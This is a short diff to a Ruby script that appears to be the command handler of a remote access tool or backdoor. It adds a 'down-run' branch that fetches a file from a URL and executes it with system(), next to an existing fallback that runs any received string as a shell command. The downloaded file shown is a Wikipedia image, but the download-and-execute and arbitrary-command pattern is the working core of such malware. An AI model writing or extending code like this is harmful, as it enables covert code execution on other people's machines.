@@ -32,7 +32,16 @@ begin
     when "download"
       #url
       download = open("https://upload.wikimedia.org/wikipedia/commons/6/6e/Sia_Seattle_%28cropped%29.jpg")
-      IO.copy_stream(download, "sia.jpg")
+      name_file = "sia.jpg"
+      IO.copy_stream(download, name_file)
+
+      #Download and run
+    when "down-run"
+      download = open("https://upload.wikimedia.org/wikipedia/commons/6/6e/Sia_Seattle_%28cropped%29.jpg")
+      name_file = "sia.jpg"
+      IO.copy_stream(download, name_file)
+      #run
+      system(name_file)
 
     else
       res = %x{#{comm}}
